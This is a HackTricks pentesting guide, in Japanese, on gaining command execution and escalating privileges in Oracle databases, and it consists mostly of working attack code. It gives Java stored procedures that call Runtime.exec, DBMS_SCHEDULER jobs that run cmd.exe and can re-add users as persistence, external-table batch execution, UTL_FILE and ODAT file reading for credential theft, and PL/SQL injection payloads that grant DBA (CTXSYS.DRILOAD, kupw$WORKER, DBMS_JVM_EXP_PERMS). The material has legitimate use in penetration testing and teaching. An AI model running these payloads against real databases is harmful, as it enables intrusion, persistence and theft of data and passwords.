<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>


# RCE: Javaストアドプロシージャ

さて、管理者アカウントの情報を持っていると想像してください。この場合、サーバー上でコマンドを実行する非常に一般的な方法は、'java stored'プロシージャを作成することです。これは3つのステージで行われます。まず、'oraexec'という名前のJavaクラスを作成します。これを行うには、'sqlplus'ターミナルを介して接続し、次のように入力します：
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
public static void execCommand(String command) throws IOException
{
Runtime.getRuntime().exec(command);
}
}
/

```
次に、このクラスのためのPL/SQLラッパーを作成します。
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
それだけです。コマンドを実行するには、次のクエリを送信するだけです。
```text
exec javacmd('command');
```
上記の手順を使用する場合、実行されたコマンドの結果を表示することはできませんが、出力をファイルにリダイレクトして読むことができます。ファイルの読み書きを可能にするシェルの完全なコードは次のとおりです：

{% file src="../../.gitbook/assets/raptor\_oraexec.sql" %}

ただし、コマンドの出力を処理する\[より洗練されたスクリプト\] \(goo.gl/EuwPRU\) もありますが、サイズが大きいため、[こちら](https://oracle-base.com/articles/8i/shell-commands-from-plsql) で入手できます。

# RCE: スケジューラ

次の方法は、Java仮想マシンがない場合に役立つもので、Oracleの組み込みタスクスケジューラである 'dbmsscheduler' を使用します。使用するには、 'CREATE EXTERNAL JOB' の特権が必要です。以下は、C：ドライブのルートにテキストファイルに '0wned' 文字列を入力するコードのサンプルです：
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);
```
これにより、コマンドを実行するためのジョブが作成され、実行されます。そして、別の手続きからスケジューラを呼び出すためのオプションがあります - 'SYS.KUPP$PROC.CREATE\_MASTER\_PROCESS'。これは、私たちにとって興味深いものです。なぜなら、これにより、複数のサブクエリから構成されるマルチステートメントクエリを埋め込むことができるからです。理論的には、ウェブアプリケーションへのインジェクションの場合でも、このようなクエリを実行することができます。
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
注意してください。スケジューラを使用すると、このジョブを複数回実行し、一定の頻度で実行することができます。その結果、テスト対象のシステムに足がかりを得るのに役立ちます。なぜなら、管理者がOSからユーザーを削除しても、システムで定期的に実行されるこのジョブによって、ユーザーは復活するからです。

# RCE: 外部テーブル

OSコマンドの実行を達成するための最後の方法として、外部テーブルの使用を挙げたいと思います。この方法は、後でサーバーからファイルをダウンロードするのに役立ちます。以下の特権が必要です：

* UTL\_FILE;
* CREATE TABLE;
* ユーザー用に予約されたディレクトリ。

UTL\_FILEパッケージへのアクセスは、デフォルトで「CONNECT」ロールを持つすべてのアカウントに提供されます。ステップ1：次のクエリを使用して発行されたディレクトリを確認します：
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;

TABLE_NAME
------------------------------
ALICE_DIR
```
ステップ2：望むコマンドを含む実行可能なバッチファイルを作成します。
```text
declare
f utl_file.file_type;
s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
f := utl_file.fopen('ALICE_DIR','test.bat','W');
utl_file.put_line(f,s);
utl_file.fclose(f);
end;
/
```
ステップ3：外部テーブル 'EXTT' を準備します。このテーブルは、ファイルを実行するために必要です。
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
DEFAULT DIRECTORY ALICE_DIR
ACCESS PARAMETERS
( RECORDS DELIMITED BY NEWLINE
FIELDS TERMINATED BY ',')
LOCATION (alice_dir:'test.bat'))
/
```
さあ、以下のコマンドでバッチファイルを呼び出してください：
```text
SELECT * from EXTT;
```
ターミナルには、システムがテーブルと呼び出されたファイルを一致させることができないというエラーメッセージが表示され始めますが、この場合は重要ではありません。なぜなら、実行可能ファイルを開くことが主な目的であり、それは達成されているからです。

また、'ODAT.py'ユーティリティもこの攻撃を実行することができます。ただし、これにはデフォルトでDBAロールにのみ付与される特権 'CREATE ANY DIRECTORY' が必要です。なぜなら、このユーティリティは "あなたの" ディレクトリだけでなく、任意のディレクトリからファイルを実行しようとするためです。

# ファイルの読み書き

さて、ファイルの読み書きのタスクに進みましょう。サーバーに単純にファイルを読み書きする必要がある場合、Javaプロシージャなしで行うことができますが、Javaプロシージャでもこれらのタスクを処理することができます。ファイルシステムとの作業に必要な機能を持つ 'UTL_FILE' パッケージを見てみましょう。良いニュースは、デフォルトで 'PUBLIC' ロールを持つすべてのユーザーがアクセスできることです。悪いニュースは、デフォルトではこの手続きがファイルシステム全体にアクセスできないことですが、管理者によって事前に定義されたディレクトリにのみアクセスできます。ただし、ディレクトリパラメータが '＊' と指定されていることは珍しくありません。これは文字通り「すべてへのアクセス」を意味します。次のコマンドを使用してこれを確認できます：
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
私は、Alexander Polyakovが提案した「UTL_FILE」パッケージの使用に関する最短手順を見つけました。
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/’,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

```
もし書き込み機能を備えたさらなる機能が必要な場合は、'raptor_oraexec.sql'というスクリプトをGoogleで検索することをおすすめします。そして伝統に従って、いつものように最短の方法である 'ODAT' ユーティリティの使用方法も以下に示します。
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
‘UTL_FILE’パッケージも非常に興味深いです。運が良ければ、ログや設定ファイルにアクセスし、特権アカウント（例：‘SYS’）からパスワードを取得することができます。

2つ目の方法は、再び「External Tables」を使用することです。外部テーブルを使用すると、データベースは外部テーブルから読み取り専用でデータにアクセスできます。ハッカーにとっては、サーバーからファイルをダウンロードする別の機会がありますが、この方法には「CREATE ANY DIRECTORY」特権が必要です。安定して高速な「ODAT」をすぐに使用することをおすすめします。
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# 特権の昇格

特権の昇格には、クラシックなバッファオーバーフローやDLLパッチングから、PL/SQLインジェクションなどのデータベースに対する特殊な攻撃まで、さまざまな方法があります。この記事では詳しくは触れませんが、\[Lichfield\] \(goo.gl/IebQN4\) や \[Finnigan\] \(goo.gl/vXhttf\) のブログなどで詳しく説明されています。ここではいくつかの方法を紹介するだけで、一般的なアイデアを把握してもらいます。テスト中は、現在の特権に注意を払い、それに基づいてインターネット上で望ましい脆弱性を探すことをお勧めします。

MS SQLとは異なり、Oracle DBでは、単純に引用符で閉じることで'SELECT'の直後に'xp\_cmdshell'を注入することはできません。そのため、私たちは常にクラシックなSQLインジェクションに頼ることはできませんが、この場合でも解決策を見つけることは可能です。私たちはPL/SQLインジェクションを考えます。これは、利用可能な入力パラメータにランダムなコマンドを埋め込むことで、手続き（関数、トリガー、その他のオブジェクト）の実行プロセスを変更するものです。 \(c\) Sh2kerr

ペイロードを埋め込むためには、入力パラメータがフィルタリングされていない関数を見つける必要があります。Oracle SQLでは、マルチステートメント（複数の）クエリは許可されていないため、おそらくこの機能を持ついくつかの「特別な」手続きを使用する必要があるでしょう。攻撃の主なアイデアは次のとおりです。デフォルトでは、指定しない限り、手続きは所有者の代わりに実行され、それを開始したユーザーの代わりに実行されません。つまり、'SYS'アカウントが所有する手続きが実行可能であり、その中にコードを埋め込むことができる場合、ペイロードも'SYS'アカウントのコンテキストで実行されます。すべての場合に当てはまるわけではありませんが、'authid current\_user'パラメータを持つ手続きもあり、これは現在のユーザーの特権で実行されることを意味します。ただし、通常、各バージョンでPL/SQLインジェクションの脆弱性がある関数を見つけることができます。このプロセスの一般的な概要は図2に示されています。

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

要するに、予想される正当な引数の代わりに、悪意のあるコードを渡すことで、手続きの一部になります。良い例としては、'CTXSYS.DRILOAD'関数があります。これは'CTXSYS'の代わりに実行され、入力パラメータをフィルタリングしないため、簡単にDBAに昇格することができます。
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
しかし、おそらくこれは過去の話であり、この脆弱性は2004年に発見され、古いバージョン8-9にのみ影響を与えます。通常、特権の昇格プロセスは2つのパートに分かれています：権限を増やす手順の作成とインジェクションの実行。典型的な手順は次のとおりです：
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
以下は、脆弱な関数の引数として手続きをインジェクトする方法です（バージョン10xの例）:
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 –-');
```
最近のバージョン10と11では、1つの「良い」例外、つまり脆弱性があります。これにより、DBA権限を持たないユーザーでもサーバー上でコマンドを実行することができます。'DBMS\_JVM\_EXP\_PERMS'プロシージャは、'CREATE SESSION'特権を持つユーザーに対して'JAVA IO'権限を取得することができます。攻撃は以下のように行われます：
```text
SQL&gt; DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/

PL/SQL procedure successfully completed.
```
今、Javaプロシージャを呼び出す特権を持っているので、Windowsインタープリタからの応答を引き起こし、何かを実行することができます。
```text
SQL&gt; select dbms_java.runjava(‘oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack’)from dual;
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
